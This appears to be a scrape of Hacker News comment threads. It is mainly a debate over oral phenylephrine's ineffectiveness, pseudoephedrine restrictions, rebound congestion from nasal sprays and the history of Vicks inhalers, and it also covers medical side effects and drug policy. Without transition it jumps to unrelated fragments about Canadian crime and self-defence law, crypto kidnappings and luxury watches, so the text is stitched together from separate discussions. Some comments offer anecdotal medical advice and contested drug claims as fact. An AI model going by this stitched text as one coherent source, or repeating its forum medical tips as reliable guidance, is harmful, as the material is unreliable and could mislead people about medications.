phenylephrine is actually completely useless as a decongestant (rather than just much worse than pseudoephedrine). Their preliminary review of studies suggested that it is probably, in fact, useless. This proceeding is now proposing to ban it on the grounds that it's ineffective and so people should not be encouraged to buy and use it as a medicine for purposes for which it doesn't actually work. (There doesn't seem to be much corresponding initiative to remove or reduce the restrictions on pseudoephedrine.) reply Zak 1 hour agoparentThe restrictions on purchasing pseudeophedrine should be repealed. Their imposition led methamphetamine manufacturers to switch to a more efficient process based on different ingredients. Purity and production volume increased substantially. A repeal won't turn back the clock on that of course, but it will make life easier for people with congestion. https://dynomight.net/p2p-meth/ reply Stevvo 29 minutes agorootparentWasn't that literally the plot of Breaking Bad? Walt's meth was p2p meth. reply mullingitover 22 minutes agorootparentprevI'm just as annoyed with the hurdles to buying real pseudoephedrine as anyone else, but let's not make the production of bathtub meth any easier. It is not worth it. reply Zak 7 minutes agorootparentGiven the prevalence of P2P meth and apparent inability of governments to do anything about it, this does not seem like a rational position to me. If there was any reason to believe that large scale production will ever be substantially curbed, there might be a case for it. reply Clubber 10 minutes agorootparentprevWhy? Do you believe it made any dent in meth manufacturing what so ever? It's just drug war theatre. reply Dr_Birdbrain 1 hour agoparentprevAdditional context on why phenylephrine was ever approved to begin with—apparently it is effective if you use it as a spray, but apparently nobody bothered to check what happens when consumed orally, and it turns out your digestive system degrades it quickly and it doesn’t even make it into the bloodstream. reply hinkley 1 hour agoparentprevI’ve had two doctors and two NPs tell me to stop using sudafed. It dries out the mucus membranes and allows infections to start. If you’ve had sinus infections before, they suck and you don’t want them again. Give the Sudafed away. (It also gives me horrible insomnia if I take it at night so it wasn’t a huge hardship). Guaifenesin thins the mucus instead, makes it more watery so it drains down the throat with no further complications like sore throat and coughing. And the extra volume helps flush bacteria out of the sinuses. reply Dr_Birdbrain 1 hour agorootparentThe insomnia effect is no joke! It’s an amphetamine. I used to take 24-hour allergy medicine with pseudoephedrine, and it took me years to realize it was the thing that was giving me insomnia during allergy season—for years I thought I just had periodic bouts of intense insomnia. reply kube-system 46 minutes agorootparentprevEveryone's body and ailments are different. For some people in some situations, the benefits of pseudoephedrine outweigh the side effects. For others, it doesn't. Drugs should be used on an individualized basis. reply SoftTalker 1 hour agorootparentprevI stopped taking pretty much any OTC meds about 10 years ago. My sinuses seem much healthier. I hardly ever get congestion or runny nose anymore. Not sure there's a correlation here but for me, they don't seem to have any benefit. reply bombcar 23 minutes agorootparentIn general, things like medicine/drugs (even caffeine!) should be used as sparingly as possible, so they're maximally powerful when you do need them. If you pop OTC meds at the first sign of anything, your body gets used to it and it becomes a baseline; whereas before it would blow all the symptoms away, now you need it just not to get significantly worse. reply sigzero 7 minutes agoparentprevI went to the doctor recently. I usually take what I am taking so they can see it. I was taking Sudafed and had just purchased it. She took it out of my hand and told me basically all that and threw it in the trash. reply matttproud 5 hours agoparentprevThe need to show an ID to purchase real pseudoephedrine (feels like an oxymoron to write that) can be a legitimate PITA. I am American who lives abroad but is frequently back in the U.S. for family reasons. I suffer from sinus problems, so I periodically need to purchase pseudoephedrine-based products. Because I have no state ID, the show-ID-based workflow essentially fails. For whatever reason, the pharmacies won't take a U.S. passport (or foreign ID card), so they end up spending 15 minutes futzing with the data entry software, only to resign to entering garbage into the system. And as OP points out: Phenylephrine is 100% useless. reply slowmovintarget 2 hours agorootparentPhenylephrine is useless. As an extra added bonus, it will still spike your blood pressure, so it isn't just useless, it's dangerous to people with high blood pressure. Nasal irrigation is the way to go for sinus trouble. It's more work and takes a little getting used to, but no ID needed to buy saline and baking soda packets, and it actually works. reply Tagbert 57 minutes agorootparentORAL phenylephrine is useless, Nasal is not. reply deng 11 hours agoparentprevSo at least here in Germany, we pretty much all use nasal spray with xylometazoline, and it's very effective as it also binds to adrenergic receptors. It does not seem to be available in the US, and at least from a cursory search I cannot find out why...? EDIT: After looking a bit more, the simple answer seems to be that it's not FDA approved for nasal congestion, and since there's not much money to be made, there's simply no incentive to go through the costly approval process.. reply robinduckett 10 hours agorootparentThey have oxymetazoline but I think the problem with this class of decongestants is that it is ineffective and dependency is basically guaranteed if used for more than a couple of days reply deng 10 hours agorootparentOxymetazoline is different from Xylometazoline, although it was derived from it. Xylometazoline is pretty harmless for adults when not used over extended periods (it is advised to not use it longer than 6 days, but that will cover your typical cold). It is true that if you take it regularly over extended periods, you will have a rebound effect and your nose will get congested when not taking it, so in that way, you develop a \"physical dependency\", but that's obviously much more harmless than other medication dependencies. Getting off a Xylometazoline dependence means that you'll have to deal with a congested nose for a few weeks... reply sph 10 hours agorootparentI don't see from your comment how the risk from congested nose for a few weeks deems it \"harmless\" for you. Two fully congested nostrils is hell for one night alone, imagine a few weeks of that. A few weeks of terrible sleep, if any. It's torture. It can also cause permanently enlarged turbinates with chronic use. reply deng 10 hours agorootparentI said it's more harmless than other medication dependencies, like getting hooked on pain medication or benzos. Even here in tightly regulated Germany, Xylometazoline can be bought without a prescription. It is very effective and, compared to other drugs, pretty harmless. Look, there are always extreme cases. Just look up how many people need a liver transplant or even die each year from misusing paracetamol. So should we make it a prescription drug? Maybe, I don't know, it's always a trade-off. reply gojomo 1 hour agorootparentIs there any basis to think xylo- is better than the similar oxymetazoline available in the US? Both the efficacy and downsides seem similar from discussion so far. reply sph 18 minutes agorootparentprev> I said it's more harmless than other medication dependencies, like getting hooked on pain medication or benzos. I've never taken any opiod, but two weeks of being unable to breathe properly or sleep sounds as hellish as my idea of quitting heroin. I mean, I quit smoking, hardest thing I've ever done, and the physical withdrawal effects were insignificant compared to that. It's funny; looking back, I quit smoking exactly BECAUSE I was suffering from crazy congestion, and after a week of Afrin and poor sleep I thought quitting smoking altogether would help me regain my sanity. reply qwerty456127 8 hours agorootparentprevMany medicines pose some risk to some people who would abuse it for too long. Xylometazoline just is crazy effective (instantly eliminates congestion and running nose completely in most cases) and completely harmless in what looks like 99% cases of usage - nearly-everyone here in the EU uses it happily and has no problems. I would really dread a cold without it and never travel without having it with me. Just try to not over-use habitually. The sense of measure is always a key to healthy and happy living. reply jorvi 7 hours agorootparentprevThat’s why if you developed a dependence you don’t quit cold turkey. The strategy I’ve heard is purchasing a normal bottle, and refilling it with boiled cool water when it’s ½ empty. Then refilling it again when it’s ¾ empty. Xylometazoline is an absolute godsend, and has even more efficacy in a dual-action spray with saline water. It feels nothing short of magical to do one spray per nostril, and be completely uncontested in less than 10 minutes. reply gojomo 1 hour agorootparentIn my experience oxymetazoline has similar fast-action - even \"10 minutes\" seems a bit on the long side. reply sph 10 hours agorootparentprevWorse, the symptoms gets worse after you stop using it, see rhinitis medicamentosa. Many people have used decongestants so much they cannot quit them or will have to suffer weeks of nasal congestion. I risked going through that; later I swore I will never touch one ever again. reply Eddy_Viscosity2 6 hours agorootparentI've been through this and sucked hard. Never will I use a decongestant nasal spray again. If there was a way to somehow sum up all of the suffering caused by these sprays from dependency (which lasts weeks, months, years even) and compare that with the suffering alleviated from a cold (which lasts a fews days), my bet is these cause more harm than good. reply karmonhardan 5 hours agorootparentThe best thing I ever did for decongestion was to get outside and start wearing a mask during the winter. The air entering my nose is clearer and warmer, which causes less mucus production. The mucus that is produced is more likely to drain, rather than sit around thickening and waiting to be blown out. I wish I'd thought to wear a mask while out when I was younger; could have saved myself much suffering waiting at the bus stop and during the subsequent schoolday. reply derekp7 4 hours agorootparentBack when I was a kid, scarfs were more popular and served a similar purpose. reply bondarchuk 5 hours agorootparentprevDid you really develop such heavy dependence after using it a few days at a time? I don't get that at all. reply pull_my_finger 4 hours agorootparentIt's not a dependence like mental addiction. Your body becomes dependent on it. Your sinuses \"rebound\" and all but completely block in absence of the spray. I had a cold that blocked my nose up so bad I couldn't sleep because I was afraid of suffocating so I tried one of the sprays and it opens you up like magic, super effective. But about an hour after use if would completely block up again where you literally can't inhale through your nose at all. That's how it is even after you get over the cold/illness. You have to continue to use the spray to keep your airway open until you suffer through breaking the \"addiction\" by not using it for however long that takes. It really does immediately open your airway, but I won't EVER use it again because it's really scary to be completely blocked like that and have to get a dose in every 30mins-hour just to breath. reply Terr_ 9 hours agorootparentprev> Worse, the symptoms gets worse after you stop using it, Very tangentially, \"iatrogenic\" is a nice niche vocabulary word: Something unintentionally caused by a medical activity, usually undesirable. reply morsch 8 hours agorootparentprevKind of funny to see a medication that's super common in Germany, widely recommended by doctors, given to children, etc. to be discussed in those terms. reply Moto7451 8 hours agorootparentThis isn’t that strange in the context that all medicines, while generally safe in OTC form, can have negative side effects if used for too long or at the wrong dose or in the wrong circumstance. My wife has one kidney and as such is told to avoid NSAIDs as a class of medicine. She’s realistically fine taking it every so often but her doctors are asking her to avoid using kidney capacity that could hypothetically be needed to filter and excrete something else. Acetaminophen/Paracetamol is great alternative for her since it’s processed in the liver. However if you’re a frequent drinker, have a liver deficiency, or have to take some other drug straining your liver, it’s contraindicated. For most of us most of the time you’re completely correct though. In the case of these nasal spray decongestants I had a case of rebound congestion due to over-reliance on them while surviving some family bringing really bad colds into the house and my son starting daycare. It was really bad. I then managed by switching to an alternating schedule of pseudoephedrine and the nasal spray so I could reduce the physical dependency on the latter and get a good night’s sleep. My doctor eventually cleared me to take an allergy spray medication (Fluticasone propionate) that is safer for long term use but generally not used for colds because it inhibits immune response and mask the symptoms which can cause new infections and hurt your ability to heal. Yet another case of the mundane medicine that is contraindicated. While seemingly being the wrong thing to be put on while fighting off infections it worked out great. After four months I had seen enough child germs and no adult has brought their own plague or food poisoning (it was a very bad summer for me) and I finally became healthy again. reply deng 4 hours agorootparent> Acetaminophen/Paracetamol is great alternative for her since it’s processed in the liver. However if you’re a frequent drinker, have a liver deficiency, or have to take some other drug straining your liver, it’s contraindicated. What many people don't know: Overdosing on paracetamol is the leading cause of acute liver failure. It's also contraindicated for people with Gilbert's syndrome, which is actually pretty common (~5% of people in the US) and most people don't even know they have it, as it's harmless and usually only found accidentally through high bilirubin levels in the blood. reply pfdietz 1 hour agorootparentWhat is very common is hepatosteatosis, or fatty liver syndrome. Something like 1/3rd of American adults have it. reply wruza 9 hours agorootparentprevSame. I’d rather start and quit smoking again than this. reply dreamcompiler 9 hours agorootparentprevOxymetazoline is an extremely effective nasal decongestant. It works almost instantly and it lasts 24 hours. It also creates dependency. A drug that is ineffective cannot cause dependency. reply admash 9 hours agorootparentOf course it can. You take drug A for 5 days to get rid of symptom X. The symptom X does not go away. It is ineffective! You stop taking drug A and immediately experience brutal migraines that go away when you start taking drug A again. Ergo, you have become dependent on drug A for normal functioning, even though it is ineffective at ridding you of symptom X. reply relistan 10 hours agorootparentprevI’ve wondered this also. As an American who lived in Germany and found this while living there, I can attest that it’s quite effective for me. There are other quite useful and safe drugs that are not available in the US. reply Aurornis 1 hour agorootparentThe US equivalent is oxymetazoline https://en.wikipedia.org/wiki/Oxymetazoline It's actually slightly more selective for a1 receptors than the German alternative.

A number of the states coordinate their policies, so it looks like nation-wide action but really isn't (in a legal sense). FDA doesn't have the legal authority to put medications \"behind the counter\" like you would see in Europe or Canada.

To add to what you've said, Sudafed (as an example brand name) opens your eustachian tubes which are passages from your inner ear to your throat. If you think you might be getting an ear infection, Sudafed increases draining and potentially helps prevent a worse infection. As mentioned, it helps air equalize to the atmosphere via these tubes. If you make a yawning motion now and hear your ears crackle, that's the air moving through your eustachian tubes. You'll notice that crackling decrease when an ear infection may be imminent. I tried the useless alternative and discovered on my own that it was, indeed, useless. And it was quite expensive, with great marketing on the box. reply gniv 13 hours agoparentprevI read this and was puzzled, until I realized that you are talking about the pills. The nasal spray is effective, although probably not more effective than a saline solution. reply rrrrrrrrrrrryan 1 hour agorootparentThe efficacy of the nasal sprays had already been demonstrated when they introduced the pills. Surprisingly, the efficacy of the pills was never properly demonstrated, and now that it's being investigated, they're pulling it from the shelves. reply notpushkin 12 hours agorootparentprev> although probably not more effective than a saline solution I guess saline is a baseline against which effectiveness should be measured here, especially since nasal sprays are usually saline plus something. (I guess? Not sure about Sudafed specifically.) reply bottom999mottob 10 hours agorootparentI'd argue that saline should be the panacea here. I doubt very many people do at-home saline rinses with filtered, sterilized water and a simple mixture of salt and baking soda.

Before Sudafed was common in pills, they had the small disposable inhalers where the pseudoephedrine was not in crystal form but was dissolved in vaporous liquids like menthol. Inside the inhaler there is a cotton piece soaked with the pleasant-smelling liquid. The aroma vapors are drawn right up into the sinuses along with the active ingredient. The inhaler itself was first marketed during World War II by the well-established 19th century Vicks company, already very successful for decades with it's earlier VapoRub aromatic topical OTC formulations. People are probably aware that this is one of the companies that is older than the US FDA. Older than the Fed & income taxes too, for those who are keeping score ;) Natural products like ephedrine have long been the inspiration for medicinal chemists to synthesize similar compounds for potential screening as new drugs, so a number of new experimental relatives such as pseudoephedrine were produced eventually. As the name implies, people did not always know what the real difference was between ephedrine and pseudoephedrine, since both molecules have the same molecular weight, naturally because both have the same number of carbons, hydrogens, oxygen, and nitrogen content. Only a slight difference in chemical structure between the two, which got figured out soon enough. Some of the less-similar new drug candidates were ordinary amphetamines. They are the ones that really got popular fast, especially in wartime :\\ Now when the unique inhalers were born, it was a bit of the new synthetic ingredient along with the traditional aromatic mixture that Vicks was famous for, and the Vicks Inhaler was deemed safe & effective as recommended for OTC use. People loved it. Nobody had ever had anything as effective as that. IIRC it was 50 milligrams per inhaler soaked into a few hundred milligrams of aromatic essential oil mixture. As expected they were a lot stronger when you first started smelling one. That's because it was 50 mg of meth-amphetamine in the Vicks inhalers. Parents would buy them for their kids, because they were so \"safe\", for self medication naturally, even at times when they would not consider dosing them up with cough syrup. There was never any FDA-approved prescription for methamphetamine in any other form, only this one OTC product. I would think the inhalers themselves were patent encumbered until the 1960's (remind you of an Epipen?) and by the 1970's other companies like Sudafed offered their own version, only not containing meth, give me a break. The meth version of amphetamine became recognized as a dangerous drug in the after-war years when the negative effects became apparent with soldiers who had been given it in pill form habitually as stimulants, often when facing the most serious combat. No other company ever was able to put meth in their inhalers, but Vicks slipped in under the wire and couldn't even be stopped for decades until some time after the DEA came into being. Everybody else was using pseudoephedrine from the start. By this time crystal meth was just beginning to emerge, which people were trying to avoid when they saw what it was like, at the same time different people started seeking meth more intently. Orders of magnitude more out-of-hand now. The way Vicks stayed under the radar the whole time with meth in it, was hiding in plain sight. Right there on the inhaler in fine print where it always was, active ingredient desoxyephedrine 50 mg. Simply a less-common alternative chemical name for meth, and desoxyephedrine had become a very uncommon rapidly deprecated name quite early. Way before any amphetamines were commercialized, they were instead marketed using the well-known convention based on the Alpha-MethylPHenylEThylAMINE type nomenclature. Anyway, back in the 1970's when it was first becoming known that shady operators were cooking meth by starting with inhalers, I looked at one of them and sure enough, 50 mg meth per Vicks inhaler. Who knew? For a while there I figured they must be starting with way over 20 inhalers and probably would not extract nearly a gram of meth but it sounded feasible. I wasn't going to be the one to do it, my first job out of college was working for a company that was a real pharmaceutical manufacturer. So I wasn't going to tell anybody either. There was already talk among law enforcement about cracking down on this kind of thing. Suspicion of inhalers was beginning to barely arise, it was thin but widespread among anybody who had heard anything about this. Eventually I figured out that the clandestine cookers were synthesizing their meth by using the pseudoephedrine in non-Vicks inhalers as starting material for their reactions ! Well, what do you know? Was I wrong the whole time? I \"guessed\" so. With not-so-blurry 20/20 hindsight, I would estimate that before I got around to figuring this out, a clandestine chemist had come along way before I knew a thing and had started out extracting grams of meth directly from Vicks inhalers. And the meth heads loved it, found out it was coming from inhalers and the word got around among them. Some other chemist picks up the inexact word-of-mouth and by this time Vicks inhalers are outnumbered, sharing shelf space with numerous alternative brands, all of them containing pseudoephedrine as expected, and cheaper too. If they look at Vicks, it's the odd ball out, that doesn't look like the same kind of \"ephedrine\" as everything else. So they figured out how to do some home made reactions starting with Sudafed. And this is what was just starting to go through the roof. This was before the Sudafed pills really took over, once they showed up they flew off the shelf way faster than the inhalers because there were more milligrams. One day in the '70's I was in Walgreens and there was somebody buying over a dozen Sudafed inhalers so I knew what they were up to. I went over to the aisle and looked at the then-current Vicks Inhaler, which I hadn't checked in a while, sure enough 50 mg of desoxyephedrine, active ingredient, same as ever. The poor Sudafed buyer wasn't the least bit aware that real meth was right there on the shelf next to it. And I wasn't going to say a thing :) Most doctors and pharmacists didn't even have a clue. Within a few years Vicks stated putting in pseudoephedrine themselves instead of meth. Until it got way too far out of hand and the pseudoephedrine became tightly controlled, much more tightly than the meth was, as can be seen.

It doesn't explicitly say it has to be from the same state as the one in which you are buying the medication, and it leaves the seller some latitude in what to accept.

But severely restricting medication that is used to effectively treat disease because it has abuse potential only harms legitimate users. But definitely worth auditing prescriptions to ensure that they're being issued for valid diagnoses. But as for illegitimate users? You ban it, they'll find something else. And as someone who needs ADHD meds to do things like \"remember I have a todo list, remember where I left it, and remember to use it\", I very much resent the people who abuse the meds I need to function in our society to pass their law degrees easier. I resent the meth addicts who try to get an ADHD diagnosis for their kids so they can abuse (or sell...) their children's ADHD meds when they can't afford meth, because it means I have to pee into a jar every three months to prove I'm not a meth addict who is abusing methylphenidate. (My country uses methylphenidate / Ritalin / Concerta (the slow release form) as the first treatment for ADHD, Adderall is not prescribed here that much, if ever, but it is possible to be prescribed dexamphetamine if you're bad enough). But I really do object to glibly implying that every child who is prescribed a treatment for ADHD is actually a case of pharmacists gleefully overmedicating, it's naïve, unsympathetic, and, tbh, rather unfair to pharmacists. As for what schedule a drug is... ...is the harm of Adderall abuse the same as the harm of fentanyl abuse? Drug schedules aren't a good way to determine harm, IMO. They're a good way to discern moral panics though. E.g., in my country, Class A, the drugs that attract the highest penalties, include magic mushrooms, mescaline, DMT, and that one you get from licking toads, bufotentine or something, alongside classics like heroin and cocaine. Fentanyl is Class B, alongside opium, morphine, amphetamine, methylphenidate, MDMA, and one that always amuses me, hashish. * There's probably some dumb-ass rules around declining to dispense abortifacients because of religious beliefs, I'm sure. reply jclulow 10 hours agorootparent> I very much resent the people who abuse the meds I need to function ...

You can't stop this stuff from happening. So at least let the normal use cases that benefit society through. Don't put everyone else in the same straight jacket. We don't deserve to be punished for the bad gradients some people fall into. reply qzw 5 hours agorootparentprevIt is a bit silly to ban a useful drug like pseudoephedrine while large parts of the US is in an opioid crisis. Kind of like how lawn darts have disappeared from stores but you can still buy all sorts of weapons. That said, a lot of laws are based on established traditions. Alcohol use goes back thousands of years, and the other things you mentioned such as vehicles and weapons are tools going back even longer. They are dangerous tools, to be sure, and often employed unnecessarily in this society, but tools nonetheless. Once upon a time most people depended on their weapons and vehicles to survive, and differences in the quality and quantity of weapons and transportation technology have historically led to the rise and fall of entire civilizations. reply equestria 13 hours agorootparentprev> Maybe license people to buy meds and take it away if they abuse it?

They just switched to different syntheses, and there are still large-scale imports that sometimes get caught, sometimes don't. People were still trying to claim the program was a success because they had stopped gangs getting pseudo as a precursor. But so what? it's done literally nothing to stop criminals profiting, nor to stop people getting addicted to meth, with all the associated public health and petty-criminal consequences of that. And now it's harder for ordinary people to get effective decongestant. It just seems that nobody is willing to admit the whole thing was pointless. reply EdwardDiego 12 hours agorootparentSame in New Zealand, we removed pseudoephedrine as an option unless you had a special dispensation from the Ministry of Health - mainly due to pharmacies being ram-raided for the pseudo. The end result? The gangs just started importing pseudo, before later just switching to importing methamphetamine directly (something that Australia's deportation policies really helped with as the \"501s\" as we call them that were deported back to NZ often had existing connections that could facilitate the direct importation of meth). It's a really interesting supply chain that involves organised crime groups in multiple countries, often starts in India for the precursors, then clandestine labs in Laos/Vietnam/Thailand overseen by Chinese groups in conjunction with local groups, then smuggled via the Pacific Islands, notably Fiji and Samoa where the Chinese groups have established transshipment facilities, before being smuggled into Australia and NZ by local groups who then distribute and supply it. A new development has been the Central American cartels branching out from cocaine to meth so there's been a bunch of meth coming directly from the Americas. reply sodality2 15 hours agoprevI remember complaining to my friends about how frustrating it was to hear that a medicine I frequently used turned out to be placebo, exactly one year ago today.

(The lozenges don't appear to have this issue.) reply jart 12 hours agoparentprevHow can you believe you've been taking a placebo for years? Phenylephrine is used for the illicit synthesis of methamphetamine, so there's an inherent bias towards anything that gets it off the shelves. Cherry picking studies that say it's ineffective is more velvet glove than using only the iron fist to ban the stuff. But make no mistake that the iron fist is taking your meds away either way. reply stephen_g 12 hours agorootparentPseudoephedrine is the one that is both proven to be effective and is the precursor to meth. Phenylephrine is the useless placebo that they put in the tablets on the shelf only because it can’t be used to make meth. It should be torn off the shelves because it’s useless. The only reason the ‘PE’ (marketing term for the ineffective phenylephrine) tablets might be helpful is because they usually also have paracetamol (acetaminophen) in them which is probably the only bit that works. They don’t work as a decongestant for most people like pseudoephedrine does though. reply sodality2 12 hours agorootparentprevI believe that it doesn’t work wholeheartedly, because every time I try it, it is ineffective - but my sinus problems are rarely bad enough to warrant medication (it’s been one year) and by then I’ve forgotten what works and what doesn’t. Also, I suspect you’re mixing up your drugs. Phenylephrine (the drug in this article) lacks the methyl structure to be used for the synthesis of methamphetamines. In fact, that’s why it was popularized - pseudoephedrine, the truly effective sibling, was becoming too good for meth production, so they created a less potent alternative, phenylephrine, that lacks the ingredients necessary. They then locked pseudoephedrine behind the counter. Turns out the oral form of phenylephrine is less than “weaker” - it’s largely useless - so they pumped out enough of this crap to the tune of $1.7B that the American public spent every year for 18 years after they knew. reply jart 12 hours agorootparentAh gotcha. So the cynical thing I thought would happen already happened. Glad to hear we're on a road where peak cynicism is looking behind us. reply culi 12 hours agorootparentprevI think you're confusing Pseudoephedrine (which works and is used to produce meth) with Phenylephrine (which doesn't work and cannot be used to produce meth). This article is about removing phenylephrine (sudafed PE) from shelves. Studies have pretty thoroughly showed it is completely ineffective for what it is marketed for reply Aurornis 1 hour agoprevI'm sure this will be unpopular, but I think the real problem with Phenylephrine is that it isn't dosed appropriately in standard formulations. The standard 10mg dose is too low. Decongestants work by constricting blood vessels, which inherently increases blood pressure as a side effect. Pseudoephedrine at standard doses is known to raise blood pressure slightly. Phenylephrine at standard doses (10mg) shows no such effect (Source https://journals.lww.com/ebp/abstract/2018/03000/how_much_do... ) Phenylephrine does increase blood pressure when delivered by IV at doses that work. The oral 10mg dose just isn't enough to get absorbed and do anything. It's not that phenylephrine is ineffective, it's that it's underdosed in the oral formulation. reply abbefaria27 37 minutes agoparentThere was some article about it on HN a while ago. If I remember right the problem was that its bioavailability is super low. You can take all you want, but only a tiny percent makes it through to get absorbed. In theory you could increase the the dose a lot but I imagine that might have other issues. reply DidYaWipe 12 hours agoprevWay overdue. I wonder if the purveyors of this fraud have ever been sued. One refrain I got tired of hearing was that it \"wasn't a safety issue.\" WRONG. Anyone who has ever had a ruptured eardrum can tell you that it is 100% a safety issue. If you're about to take a flight with any congestion, you're relying on decongestant to save your ears. I've had ruptured eardrums; it's probably the worst pain I've experienced. I had to take a flight a couple years ago with only this crap, and must have come extremely close to rupturing them again.

To me this has always seemed like obvious fraud. We don't have class actions in the UK, but perhaps in USA there's a chance of punishing this sort of behaviour going forward? Basically they took the active ingredient out, added a similarly sounding chemical, continued to sell the new known-ineffective chemical in the virtually the same packet, under the same trade dress and branding... Pseudo was really effective for me. When I first bought Sudafed after they took the active ingredient out (of the easy to find product) I thought I'd misremembered, took a couple of illnesses before I twigged, then some very careful analysis of packaging to make sure to get the actual medicine. reply jfengel 1 hour agoparentInteresting.

My lived experince with PE is it never works most of the time. But if I realise I need psuedoephedrine and I'm not somewhere or sometime where I can access it, I'll get PE and hope. Sometimes hope works, but it usually doesn't clear my sinuses very effectively. But if I have sinus congestion related to flying, I might also have soreness related to flying and take PE (because you can get it at the airport) and ibuprofen together, and maybe it works.

Two things are simultaneously true in Canada right now: 1) the government has become unwilling/unable to actually keep repeat violent offenders in jail (and has totally failed to prevent them from acquiring illegal firearms), and 2) the law essentially outlaws the use of any tools (firearms, pepper spray, knives) for the express purpose of self-defense. It's functionally impossible to get a concealed carry permit in Canada. They just don't issue them, even if you have a restricted firearms license, even if you're a high-profile individual, and even if there's an immediate threat to your life. You have to rely on police and, if you can afford them, expensive private security who probably can't carry a firearm either. I should note that the kidnappers in this case (plural) were all armed. The politicians, of course, are protected by the armed Parliamentary Protective Service.

An important note the article only mentions in the subtitle is that this is recorded crime. So recording might have gotten better/loose or the methodology is super stable and violent crime exactly as it was defined 10 years ago is up. This seems unlikely, but plausible. From the article though: “The top violent crimes in 2023 were assault not using weapons or resulting harm, uttering threats, and assault employing weapons or resulting in harm.” To me the recording of “uttering threats” pops out as something that would easily change depending on society’s sensitivities. I am not saying violent crime isn’t up. These are just some thoughts that I wish were addressed in the article. The article doesn’t go into any of the recording methods and possible changes in what is categorised as a certain type of crime that could also impact the stats. reply sndslikeseattle 6 hours agoparentprevSounds like Seattle, the police cannot chase criminals who steal cars, use them to brake into businesses and then drive off with the ATM in the back.

Instead of training in the legality of use of force, and to hit a target with a bullet, like most CCP holders get, cops get training that everyone is a potential enemy, and to spray and pray first, ask questions later.

A similar incident happened this summer in Estonia [0], kidnappers from abroad travelled to Tallinn for the express purpose of kidnapping the owner of a crypto casino who resides there.

Which is unsurprising. It's almost like the crypto markets attract criminals! reply samsin 19 hours agorootparentThe same argument could be made for physical cash reply hn_throwaway_99 19 hours agorootparentPhysical cash is much more difficult to: 1. Handle in large quantities. The ransom paid here was $1 million. With crypto, transferring that much is a few keystrokes. With cash, it's basically a large bag of cash that needs to be moved around. 2. Hold for ransom. Given point #1, kidnappers (of people and data) know that it's much easier to demand payment of large amounts in crypto than cash. If you kidnap a rich person in the crypto world, kidnappers know it's easy for him to sign over a very large amount of bitcoin quickly, which looks to be what happened here. Even for a very wealthy person, it's not logistically easy to get a million dollars in cash, never mind hand it over in a way that isn't a huge risk for the kidnappers. 3. Launder. Crypto tumblers are still a thing despite US government crackdown. Laundering cash with recorded serial numbers is much harder. I'm not denying that crypto may have some legitimate uses, but it's basically a dream come true for criminals. reply beloch 14 hours agorootparentI think this gets it right. If criminals know somebody holds a significant amount of crypto, such as the CEO of a crypto company, they don't need to have them contact somebody else to withdraw and deliver a large amount of physical cash. They don't need to convince anyone they're serious. If the victim has their phone with them or can remember a password, then the criminals just have to coerce the victim into making a transfer. Arguably, this isn't even really kidnapping in the traditional sense. It's high-tech mugging. Owning a significant amount of crypto-currency and carrying the ability to make a transfer around in your head or pocket is basically the same as carrying a suitcase full of cash. reply philistine 2 hours agorootparentIt turns out the friction of a banking system has great benefits!

I used to see \"pay with Bitcoin!\" in a couple places online about 5-8 years ago. I never see it now, and hardly anyone I know, even big time \"crypto people\", actually use crypto to buy anything.

When I wear that watch in certain circles it instantly elevates me to being considered legitimate. Poor example but we had a sister company VP (but more a reports directly to the owner type roll) in the office from the UK and he keyed in on my watch instantly. Which led him to inquire my background and find out I hadn't always been a lowly IT Director, and he had a lot of conversations you wouldn't normally have with IT and trusted what I said way more than my boss the CFO (I know IT shouldn't be under a CFO), all because he saw my watch. Instant change for my standing in the company. It's lame but it's the world we live in. A good watch can be a worthwhile investment. I recommend a non-trendy somewhat off name used one. Doesn't even need to be all that much. The one I got to keep is just a TAG and still is enough that they notice. Lawyers have treated me better. Heck even cops notice and treat me better. A good watch and a pair of good shoes (like some nice Italian boots) can make a world of difference in how interactions go. Lots of rich dudes wear Levi's so they aren't a tell you're a normie. But shoes and watch are. Just don't get something that gets dated quick because then you instantly have give them the ick. I've also had random women I've had drinks with straight up ask about it, that gives me the ick, even though I wore it specifically for them to notice, which is again ick. We're funny monkeys. reply majormajor 15 hours agorootparentprevWhen you're that rich you are going to be surrounded by people with crazy expensive stuff, and exposed to media about crazy expensive stuff, so much, that it will be more obvious. Like how you don't have to be a watch aficionado to know that an Omega is more expensive than a Casio; you just have to have heard people talking about \"regular\" vs \"expensive\" watches and seen some commercials and such. Same deal, just now talking about \"regular\" watches is a much higher baseline. (I think this is related to how \"a million dollars\" still sounds impressive because of the change from 6 to 7 digits even though it's not nearly as much money as it used to be. A lot of people have super-dated signifiers for what \"really rich\" means because of the persistent anchoring of the terms.) reply djbusby 16 hours agorootparentprevThe watch is to flaunt your wealth at a small table of other folk, with wealth, who would envy said watch.

They have old car auctions for wealthy people (like Barrett-Jackson) where certain models really do fetch as much as owners paid for them, or more. It's still a gamble, but I think your odds of at least holding your value with a classic car are much better than with a watch. I could be wrong of course; I know a lot more about cars than I do overpriced luxury watches, after all. But I suspect the watches are much more like diamonds: only \"valuable\" to the initial buyer (and mainly for sentimental reasons), and largely worthless to everyone else.

Well, you won't see that happening in a small village. Not enough people wearing expensive watches there. But in large cities with a huge amount of both domestic and foreign rich people it's bound to develop. As long as you have a good spotter able to determine if someone is wearing a watch worth barely a few hundred dollars (or less, knockoffs are a thing) or a legit 50k upwards luxury watch, it's one of the more profitable ways of criming: no weapons or drugs involved which tends to yield much harder sentencing in most jurisdictions, less chance of bystanders intervening like in a conventional robbery (most people don't even realize what has happened until they see the motorcycle speeding away), less chance of the victim fighting back or attracting help, almost no chance of getting caught on camera, and the stolen goods are innocuous to carry around - unlike with guns or drugs, if you get in a traffic control or whatnot, the chance that the cop will ask about the watch you're wearing is almost zero because your average cop has zero idea if you're wearing a 5000 dollars Rolex or a 50k dollars Rolex. reply asveikau 15 hours agorootparentprevI've heard of that in Europe for more than a decade, and started hearing it in San Francisco for about 2-3 years.

This isn't unique to the EU, it's simply the market I'm personally more familiar with, but I hope you see my point.

Crypto, and Bitcoin especially, is less (less, though not yet completely) of a Wild West due to Western nations enforcing KYC laws. Through this, addresses can be traced back to real people. Further chain analysis (Chainalysis is the name I'm most familiar with) allows investigators to follow the money through an immutible chain stretching back to 2008. In short, Bitcoin is not private. It is arguably one of the least private ways to transact, considering the Blockchain will show the history of every wallet, and where every Sat started and ended.

I've had some REALLY f*ed up interactions with major figures which are almost impossible to explain otherwise. Also in terms of funding, you will see government entities funding projects that are obvious scams over and over. These are not government entities from 'banana republics' BTW, these are western governments. It's not just the founders themselves who are corrupt, it's literally the government apparatus around it.

